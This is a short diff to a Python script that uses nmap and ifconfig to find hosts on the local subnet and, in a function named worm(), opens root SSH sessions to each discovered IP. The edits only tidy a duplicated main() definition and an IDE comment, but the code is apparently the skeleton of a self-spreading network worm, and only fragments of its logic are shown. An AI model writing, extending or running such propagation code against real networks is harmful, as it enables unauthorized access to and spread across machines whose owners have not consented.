@@ -4,7 +4,6 @@ import nmap
 import subprocess
 from subprocess import Popen, PIPE
 import base64
-def main():
     def subnet():
         process = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE)
         stdout = process.communicate()[0]
@@ -52,6 +51,6 @@ def main():
             subprocess.run(['ssh root@'  + str(ip)], shell=True)                 
 def main():
     worm()
-# Press the green button in the gutter to run the script.
+
 if __name__ == '__main__':
     main()
